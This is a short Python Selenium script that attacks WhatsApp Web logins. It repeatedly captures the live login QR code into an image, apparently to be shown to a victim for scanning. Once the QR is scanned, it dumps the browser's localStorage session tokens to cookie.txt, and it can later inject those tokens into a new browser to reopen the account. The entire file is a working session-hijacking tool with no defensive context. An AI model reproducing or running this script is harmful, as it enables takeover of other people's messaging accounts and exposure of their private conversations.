from time import sleep
from qrcode import make
from json import loads, dumps
from selenium import webdriver

def whatsapp(grab=True):
	
	print("[+] Starting webdriver...")
	options = webdriver.ChromeOptions() 
	options.add_experimental_option("excludeSwitches", ["enable-logging"])
	driver = webdriver.Chrome(options=options)
	driver.get("https://web.whatsapp.com/")
	sleep(2)
	value = ""
	if grab:
		while 1:
			try:
				new_value = driver.find_element_by_css_selector("div[data-ref]").get_attribute("data-ref") #find QR code value
				if new_value != value:
					value = new_value
					make(value).save("qr.png")
					print("[+] New QR code was saved, token: '%s'" % value.split(",")[0])
			except Exception as error:
				try:
					driver.find_element_by_id("side") #if 'side' exist auth was successful
					print("[+] Authorization was successfull, capturing cookies...")
					break
				except Exception:
					continue
		Storage = {}
		for key, value in driver.execute_script('''var items = {}, ls = window.localStorage;for (var i = 0, k; i < ls.length; i++)items[k = ls.key(i)] = ls.getItem(k);return items;''').items(): #capturing cookies
			if key == "last-wid":
				print("[+] Session %s was saved in cookie.txt" % (value))
			Storage[key] = value
		open("cookie.txt", "w").write(dumps(Storage))
		driver.close()
	else:
		print("[+] Reading cookie.")
		cookie = loads(open("cookie.txt", "r").read())
		for _ in cookie:
			driver.execute_script(("window.localStorage.setItem('%s', '%s')" % (_, cookie[_])))
		driver.refresh()
		input("[+] Press Enter for close browser.")
		driver.close()

whatsapp()